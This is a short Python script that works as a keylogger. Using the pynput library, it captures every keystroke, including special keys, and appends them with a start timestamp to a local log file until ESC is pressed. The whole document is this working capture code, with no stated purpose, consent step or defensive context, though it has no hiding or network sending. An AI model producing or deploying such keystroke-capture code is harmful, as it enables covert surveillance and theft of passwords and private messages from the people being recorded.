from pynput import keyboard
from datetime import datetime

# Log file path
log_file = "key_log.txt"

# Start timestamp
start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Initialize log
with open(log_file, "a") as f:
    f.write(f"\n\n--- Logging started at {start_time} ---\n")

def on_press(key):
    try:
        # Try to get the character key
        k = key.char
    except AttributeError:
        # Handle special keys (e.g., enter, shift)
        k = f"[{key.name}]"

    with open(log_file, "a") as f:
        f.write(k)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on ESC
        return False

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
